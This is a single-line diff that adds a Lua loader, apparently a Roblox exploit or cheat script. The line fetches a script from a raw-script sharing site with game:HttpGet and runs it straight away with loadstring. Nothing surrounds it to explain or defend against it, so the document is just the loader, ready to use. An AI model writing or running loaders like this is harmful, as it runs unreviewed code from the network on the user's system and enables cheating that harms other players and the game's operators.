@@ -1,0 +1,1 @@
+loadstring(game:HttpGet"https://rawscripts.net/raw/Project-Meow_421")()
